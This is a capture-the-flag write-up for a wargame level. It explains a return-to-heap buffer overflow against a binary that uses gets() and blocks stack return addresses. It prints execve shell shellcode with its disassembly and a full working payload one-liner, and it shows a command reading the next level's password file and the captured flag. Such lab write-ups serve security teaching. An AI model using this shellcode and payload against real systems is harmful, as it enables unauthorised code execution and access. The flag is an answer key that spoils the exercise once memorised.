# 💥 Level2 - Return-to-Heap Exploit

![Helldivers Salute](https://media4.giphy.com/media/v1.Y2lkPTc5MGI3NjExejJwMnpmeXZ0dHp1enptbDE2am9la2Z4Ymg0eXczcmRiNzFqczJjMSZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/VJN5s9dNGXLDqkLYF4/giphy.gif)

Advanced buffer overflow with heap exploitation! 🔥

## 📋 Binary Analysis

```c
void p(void)
{
    unsigned int ret_addr;
    char buffer[76];
    
    fflush(stdout);
    gets(buffer);                    // Unsafe! No bounds checking
    
    ret_addr = __builtin_return_address(0);
    if ((ret_addr & 0xb0000000) == 0xb0000000) {
        printf("(%p)\n", ret_addr);
        _exit(1);                    // Exits if return address starts with 0xb
    }
    
    puts(buffer);
    strdup(buffer);                  // Copies buffer to heap!
    return;
}
```

## 🚨 What's New: Stack Protection

### The Protection Mechanism

```c
if ((ret_addr & 0xb0000000) == 0xb0000000)  // Check if address starts with 0xb
    _exit(1);  // Kill program if true
```

**Why this matters:**
- Stack addresses start with `0xbffff...` → would be caught ❌
- Heap addresses start with `0x0804a...` → passes the check ✅
- We can't use the Level1 technique (return to stack) anymore!

## 🎯 How the Exploit Works

### Level1 vs Level2

| Aspect | Level1 | Level2 |
|--------|--------|--------|
| **Target** | Function on stack (`run()`) | Shellcode on heap |
| **Protection** | None | Stack address check |
| **Technique** | Return-to-function | Return-to-heap |

### Memory Layout

```
High Memory
├─────────────────────────┐
│ Stack (0xbffff...)      │ ← Blocked by check!
├─────────────────────────┤
│ Heap (0x0804a...)       │ ← Our target! ✅
│ [strdup() allocates here]
├─────────────────────────┤
│ Code (0x08048...)       │
Low Memory
```

### The Attack Strategy

**The key insight:** Use `strdup()` to copy our shellcode to the heap, then jump there!

```
1. Input: [Shellcode][Padding][Heap Address]
           └─24 bytes─┘└─56 bytes┘└─0x0804a008─┘
                          ↓
2. gets() writes to stack buffer (overflow!)
                          ↓
3. strdup() copies shellcode to heap at 0x0804a008
                          ↓
4. Return address overwritten with 0x0804a008
                          ↓
5. Protection check: 0x0804a008 & 0xb0000000 = 0x00000000 ✅
                          ↓
6. ret → EIP = 0x0804a008 → Execute shellcode → Shell! 🎉
```

### Why This Works

| Requirement | Status | Why |
|-------------|--------|-----|
| **Buffer overflow** | ✅ | `gets()` has no bounds checking |
| **Bypass protection** | ✅ | Heap address `0x0804a...` doesn't match `0xb...` |
| **Predictable address** | ✅ | No ASLR → heap always at `0x0804a008` |
| **Executable heap** | ✅ | No DEP → can run code from heap |

## 💣 Building the Exploit

### Step 1: Find Heap Address

```bash
ltrace ./level2
# Input: AAAA
# Output: strdup("AAAA") = 0x0804a008
```

Heap address is **`0x0804a008`** (predictable, no ASLR)

### Step 2: Get Shellcode (24 bytes)

**Source**: [Exploit-DB #42428](https://www.exploit-db.com/shellcodes/42428) - execve("/bin/sh")

```
\x31\xc0\x99\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80
```

**What it does:**
```asm
xor    eax, eax              # EAX = 0
cdq                          # EDX = 0
push   eax                   # Push NULL terminator
push   0x68732f2f            # Push "//sh"
push   0x6e69622f            # Push "/bin"
mov    ebx, esp              # EBX = pointer to "/bin//sh"
push   eax                   # Push NULL
push   ebx                   # Push "/bin//sh" pointer
mov    ecx, esp              # ECX = argv array
mov    al, 0x0b              # EAX = 11 (execve syscall)
int    0x80                  # Execute syscall
```

### Step 3: Calculate Payload

- **Buffer size**: 76 bytes
- **Saved EBP**: 4 bytes
- **Return address offset**: 80 bytes

Payload structure:
```
[Shellcode: 24 bytes] + [Padding: 56 bytes] + [0x0804a008 in little-endian]
                                                    └─\x08\xa0\x04\x08─┘
```

### Step 4: Execute

```bash
(python -c 'print "\x31\xc0\x99\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80" + "A"*56 + "\x08\xa0\x04\x08"'; cat) | ./level2
```

Get the flag:
```bash
cat /home/user/level3/.pass
```

---

> 💡 **Pro Tip**: When stack is protected, look for heap allocations like `malloc()`, `strdup()`, `calloc()`!

> ⚠️ **Security Note**: This demonstrates why multiple security layers ([ASLR](https://en.wikipedia.org/wiki/Address_space_layout_randomization) + [DEP](https://en.wikipedia.org/wiki/Executable_space_protection) + [Stack Canaries](https://en.wikipedia.org/wiki/Stack_buffer_overflow#Stack_canaries)) are needed!

## 🎉 Victory!

![Helldivers Celebration](https://media4.giphy.com/media/v1.Y2lkPTc5MGI3NjExempicnBhODF0Y3BrZG5zaWIzMmM2MWExdDZuYWNnYWJrdnRtYXg4MyZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/MlyicdUndRbn5zUiAL/giphy.gif)

**Flag captured!** 🚩

```
492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02
```
